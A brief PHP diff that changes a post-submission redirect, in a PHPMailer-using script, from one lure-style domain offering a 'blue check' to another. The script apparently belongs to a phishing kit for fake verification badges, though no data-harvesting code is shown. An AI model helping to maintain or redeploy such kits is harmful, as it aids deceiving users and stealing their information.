@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://claim-your-blue-check.vercel.app/confirm.html");
+header("Location:https://apply-for-check-mark.vercel.app/confirm.html");
 
 require 'Exception.php';
 require 'PHPMailer.php';
